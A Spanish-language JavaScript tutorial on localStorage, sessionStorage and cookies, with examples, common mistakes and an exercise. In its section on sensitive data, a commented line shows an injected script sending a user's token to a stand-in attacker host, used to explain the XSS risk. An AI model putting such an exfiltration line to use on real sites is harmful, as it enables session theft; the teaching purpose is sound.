Almacenamiento: localStorage, sessionStorage y cookies

Módulo 5 · DOM y Eventos ⏱ 30 minutos

1 · Introducción

Las aplicaciones web necesitan persistir datos en el navegador: preferencias de usuario, tokens de autenticación, carritos de compra, borradores... JavaScript ofrece varias APIs de almacenamiento, cada una con sus casos de uso, límites y ciclo de vida. Elegir la correcta es crucial para la experiencia de usuario y la seguridad de tu aplicación.

2 · Teoría

localStorage — Persistencia por dominio sin caducidad

localStorage es un almacén clave-valor que persiste indefinidamente (hasta que el usuario o la app lo borran). Los datos sobreviven a cierres de pestaña, reinicios del navegador y apagados del sistema.

// Escribir
localStorage.setItem('tema', 'oscuro');
localStorage.setItem('idioma', 'es');

// Leer
const tema = localStorage.getItem('tema');    // 'oscuro'
const idioma = localStorage.getItem('idioma'); // 'es'

// Eliminar uno
localStorage.removeItem('tema');

// Eliminar todos
localStorage.clear();

// Navegar por las claves (no es un objeto plano, es un Storage)
console.log(localStorage.length); // número de claves
console.log(localStorage.key(0)); // nombre de la primera clave

// Iterar todas las claves
for (let i = 0; i < localStorage.length; i++) {
  const clave = localStorage.key(i);
  console.log(`${clave} = ${localStorage.getItem(clave)}`);
}

// O con Object.entries (más moderno)
for (const [clave, valor] of Object.entries(localStorage)) {
  console.log(`${clave} = ${valor}`);
}

Importante: localStorage solo almacena strings. Para guardar objetos, arrays, números o booleanos, debes serializar con JSON.stringify() y deserializar con JSON.parse().

Serialización con JSON

const usuario = {
  nombre: 'Ana',
  edad: 28,
  config: { notificaciones: true, tema: 'dark' }
};

// Guardar objeto
localStorage.setItem('usuario', JSON.stringify(usuario));

// Recuperar objeto
const usuarioGuardado = JSON.parse(localStorage.getItem('usuario'));
console.log(usuarioGuardado.nombre); // 'Ana'

// ⚠️ Siempre maneja el caso de que no exista
function obtenerUsuario() {
  const datos = localStorage.getItem('usuario');
  if (!datos) return null;

  try {
    return JSON.parse(datos);
  } catch (e) {
    console.error('Datos corruptos en localStorage:', e);
    return null;
  }
}

sessionStorage — Igual que localStorage pero por pestaña

Misma API que localStorage. La única diferencia: los datos se borran al cerrar la pestaña. Cada pestaña tiene su propio sessionStorage aislado.

// Misma API que localStorage
sessionStorage.setItem('formularioPaso', '2');
sessionStorage.setItem('datosParciales', JSON.stringify({ nombre: 'Ana' }));

// Ideal para: wizards multietapa, borradores temporales, datos de sesión
// Al cerrar la pestaña, todo desaparece automáticamente

Cookies — Pequeñas, con caducidad, viajan al servidor

Las cookies se almacenan como una sola cadena en document.cookie. A diferencia de Web Storage, las cookies se envían al servidor en cada petición HTTP automáticamente.

// Leer cookies (devuelve TODAS en una cadena)
console.log(document.cookie);
// "tema=dark; sesion=abc123; ga_tracker=UA-12345"

// Escribir una cookie (reemplaza si ya existe)
document.cookie = 'idioma=es';

// Escribir con opciones (path, expires, max-age, secure, SameSite)
document.cookie = 'sesion=abc123; path=/; max-age=3600; secure; SameSite=Strict';
// max-age=3600 → caduca en 1 hora (en segundos)
// secure → solo se envía por HTTPS
// SameSite=Strict → no se envía en peticiones cross-site

// Eliminar una cookie (poner max-age=0 o fecha pasada)
document.cookie = 'sesion=; path=/; max-age=0';

// Helper para leer una cookie específica
function getCookie(nombre) {
  const cookies = document.cookie.split('; ');
  for (const cookie of cookies) {
    const [clave, valor] = cookie.split('=');
    if (clave === nombre) return decodeURIComponent(valor);
  }
  return null;
}

// Helper para escribir cookies con opciones
function setCookie(nombre, valor, dias = 7) {
  const fecha = new Date();
  fecha.setDate(fecha.getDate() + dias);
  document.cookie = `${nombre}=${encodeURIComponent(valor)}; path=/; expires=${fecha.toUTCString()}; SameSite=Lax`;
}

IndexedDB — Mención breve

Para datos grandes (>5MB), búsquedas complejas o aplicaciones offline, existe IndexedDB, una base de datos NoSQL transaccional dentro del navegador. Su API nativa es compleja y verbosa, por lo que en producción se suele usar una librería como idb o Dexie.js. No la cubriremos en detalle aquí, pero debes saber que existe.

El evento storage

// Se dispara en OTRAS pestañas del mismo origen cuando localStorage cambia
window.addEventListener('storage', (e) => {
  console.log(`Cambio en localStorage:`);
  console.log(`  Clave: ${e.key}`);
  console.log(`  Valor anterior: ${e.oldValue}`);
  console.log(`  Valor nuevo: ${e.newValue}`);
  console.log(`  URL de la pestaña que hizo el cambio: ${e.url}`);
});

// ⚠️ NO se dispara en la pestaña que hizo el cambio
// Útil para sincronizar estado entre pestañas (ej. cierre de sesión en una pestaña
// debe reflejarse en todas las demás)

3 · Ejemplo mínimo

// Guardar preferencia de tema y aplicarla al cargar
function guardarTema(tema) {
  localStorage.setItem('tema', tema);
  document.documentElement.dataset.tema = tema;
}

function cargarTema() {
  const temaGuardado = localStorage.getItem('tema');
  if (temaGuardado) {
    document.documentElement.dataset.tema = temaGuardado;
  }
  // Si no hay tema guardado, usar el valor por defecto del HTML
}

// Al hacer clic en el botón de tema
document.querySelector('#btn-tema').addEventListener('click', () => {
  const temaActual = document.documentElement.dataset.tema;
  const nuevoTema = temaActual === 'oscuro' ? 'claro' : 'oscuro';
  guardarTema(nuevoTema);
});

// Al cargar la página, aplicar el tema guardado
cargarTema();

4 · Ejemplo real

Sistema de notas con localStorage y sincronización entre pestañas:

class NotasStorage {
  static #CLAVE = 'mis_notas';

  // Obtener todas las notas
  static obtenerTodas() {
    const datos = localStorage.getItem(this.#CLAVE);
    if (!datos) return [];

    try {
      return JSON.parse(datos);
    } catch {
      return [];
    }
  }

  // Guardar una nota
  static guardar(nota) {
    const notas = this.obtenerTodas();

    if (nota.id) {
      // Actualizar existente
      const indice = notas.findIndex(n => n.id === nota.id);
      if (indice !== -1) {
        notas[indice] = { ...nota, actualizado: Date.now() };
      }
    } else {
      // Nueva nota
      nota.id = crypto.randomUUID();
      nota.creado = Date.now();
      notas.push(nota);
    }

    localStorage.setItem(this.#CLAVE, JSON.stringify(notas));
    return nota;
  }

  // Eliminar una nota
  static eliminar(id) {
    const notas = this.obtenerTodas().filter(n => n.id !== id);
    localStorage.setItem(this.#CLAVE, JSON.stringify(notas));
  }

  // Buscar notas
  static buscar(query) {
    const q = query.toLowerCase();
    return this.obtenerTodas().filter(n =>
      n.titulo.toLowerCase().includes(q) || n.contenido.toLowerCase().includes(q)
    );
  }

  // Sincronizar cambios desde otras pestañas
  static escucharCambios(callback) {
    window.addEventListener('storage', (e) => {
      if (e.key === this.#CLAVE) {
        callback(this.obtenerTodas());
      }
    });
  }
}

// Ejemplo de uso
const nota = NotasStorage.guardar({
  titulo: 'Comprar pan',
  contenido: 'Pan integral del supermercado'
});
console.log('Nota guardada:', nota);

NotasStorage.escucharCambios((notas) => {
  console.log('Notas actualizadas desde otra pestaña:', notas);
  renderizarNotas(notas);
});

6 · Errores habituales

Error 1: Guardar objetos sin serializar

// ❌ MAL: localStorage solo almacena strings
localStorage.setItem('config', { tema: 'oscuro' });
console.log(localStorage.getItem('config')); // '[object Object]' — ¡inútil!

// ✅ CORRECTO
localStorage.setItem('config', JSON.stringify({ tema: 'oscuro' }));
const config = JSON.parse(localStorage.getItem('config'));
console.log(config.tema); // 'oscuro'

Error 2: No manejar cuota excedida

// ❌ MAL: Asumir que siempre hay espacio
try {
  localStorage.setItem('datos', JSON.stringify(objetoMuyGrande));
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('localStorage lleno. Elimina datos antiguos o usa IndexedDB.');
    // Estrategia de mitigación: eliminar datos antiguos
    localStorage.clear();
    // O notificar al usuario
  }
}

Error 3: Usar localStorage para datos sensibles

// ❌ PELIGROSO: El token JWT en localStorage es vulnerable a XSS
localStorage.setItem('token', 'eyJhbGciOi...');

// Cualquier script malicioso inyectado puede hacer:
// fetch('https://atacante.com/robar?token=' + localStorage.getItem('token'));

// ✅ MEJOR: Dejar el token en una cookie HttpOnly (gestionada por el servidor)
// Si no queda más remedio, al menos no almacenes el token completo en localStorage
// Usa patrones como BFF (Backend For Frontend) que mantienen el token en el servidor

Error 4: No codificar/decodificar valores de cookies

// ❌ MAL: Caracteres especiales rompen la cookie
document.cookie = 'nombre=Ana García; path=/'; // El espacio y la tilde pueden causar problemas

// ✅ CORRECTO
document.cookie = `nombre=${encodeURIComponent('Ana García')}; path=/`;
const nombre = decodeURIComponent(getCookie('nombre'));

7 · Ejercicio guiado

Objetivo: Implementar un historial de búsquedas recientes con localStorage.

  1. Paso 1: Funciones de almacenamiento

    const HISTORIAL_CLAVE = 'busqueda:historial';
const MAX_HISTORIAL = 10;

function obtenerHistorial() {
  const datos = localStorage.getItem(HISTORIAL_CLAVE);
  if (!datos) return [];

  try {
    return JSON.parse(datos);
  } catch {
    return [];
  }
}

function agregarBusqueda(termino) {
  if (!termino.trim()) return;

  let historial = obtenerHistorial();

  // Evitar duplicados: eliminar si ya existe
  historial = historial.filter(item => item !== termino);

  // Añadir al principio
  historial.unshift(termino);

  // Limitar a MAX_HISTORIAL
  if (historial.length > MAX_HISTORIAL) {
    historial = historial.slice(0, MAX_HISTORIAL);
  }

  localStorage.setItem(HISTORIAL_CLAVE, JSON.stringify(historial));
  return historial;
}

function limpiarHistorial() {
  localStorage.removeItem(HISTORIAL_CLAVE);
}

  2. Paso 2: Integrar con un buscador

    const buscador = document.querySelector('#buscador');
const historialLista = document.querySelector('#historial-lista');

function renderizarHistorial() {
  const historial = obtenerHistorial();
  historialLista.innerHTML = '';

  if (historial.length === 0) {
    historialLista.innerHTML = '
  3. Sin búsquedas recientes
    4. ';
    return;
  }

  historial.forEach(termino => {
    const li = document.createElement('li');
    li.textContent = termino;
    li.classList.add('historial-item');
    li.addEventListener('click', () => {
      buscador.value = termino;
      realizarBusqueda(termino);
    });
    historialLista.appendChild(li);
  });
}

buscador.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const termino = buscador.value.trim();
    if (termino) {
      agregarBusqueda(termino);
      renderizarHistorial();
      realizarBusqueda(termino);
    }
  }
});

// Limpiar historial
document.querySelector('#limpiar-historial').addEventListener('click', () => {
  limpiarHistorial();
  renderizarHistorial();
});

// Cargar historial al iniciar
renderizarHistorial();

  4. Paso 3: Sincronizar el historial entre pestañas

    window.addEventListener('storage', (e) => {
  if (e.key === HISTORIAL_CLAVE) {
    console.log('Historial actualizado desde otra pestaña');
    renderizarHistorial();
  }
});

9 · Resumen

  • localStorage: ~5 MB, persiste indefinidamente, solo strings. Ideal para preferencias y configuraciones.
  • sessionStorage: misma API, pero se borra al cerrar la pestaña. Ideal para datos temporales de sesión.
  • Cookies: ~4 KB, se envían al servidor automáticamente, tienen caducidad. Útiles para sesiones, auth y tracking.
  • IndexedDB: gran capacidad, asíncrona, datos estructurados. Para aplicaciones offline y grandes volúmenes de datos.
  • Siempre serializa con JSON.stringify/parse al guardar/leer objetos en Web Storage.
  • Nunca almacenes tokens de autenticación ni datos sensibles en localStorage (vulnerable a XSS).
  • El evento storage permite sincronizar cambios entre pestañas del mismo origen.

10 · Preguntas frecuentes

¿Por qué no almacenar tokens JWT en localStorage?

Porque localStorage es accesible desde cualquier script JavaScript que se ejecute en tu dominio. Si un atacante logra inyectar código XSS, puede leer el token y enviarlo a su servidor, robando la sesión del usuario. Las cookies con HttpOnly no pueden leerse desde JavaScript, por lo que son inmunes a XSS. Para SPAs, el patrón moderno es usar un BFF (Backend For Frontend) que mantiene el token en el servidor y usa cookies de sesión seguras.

¿Cuánto espacio tengo realmente en localStorage?

La especificación dice "límite arbitrario" y cada navegador decide. En la práctica: Chrome ~10 MB, Firefox ~10 MB, Safari ~5 MB. Es por origen (protocolo + dominio + puerto), compartido entre todas las apps del mismo origen. Si excedes el límite, se lanza QuotaExceededError. Para datos grandes, usa IndexedDB.

¿Cuándo usar cookies frente a Web Storage?

Usa cookies cuando los datos deban viajar al servidor automáticamente (sesiones, autenticación) o necesites caducidad precisa. Usa Web Storage para datos que solo necesita el cliente (preferencias de UI, borradores, caché). Las cookies añaden overhead en cada petición HTTP, así que mantenlas pequeñas.

¿Qué pasa si el usuario usa modo incógnito?

En modo incógnito, localStorage y sessionStorage funcionan normalmente durante la sesión, pero sessionStorage se borra al cerrar todas las pestañas de incógnito (no solo una). Siempre verifica que Web Storage esté disponible (algunos navegadores lo bloquean en ciertas configuraciones) con un try/catch al llamar a setItem.
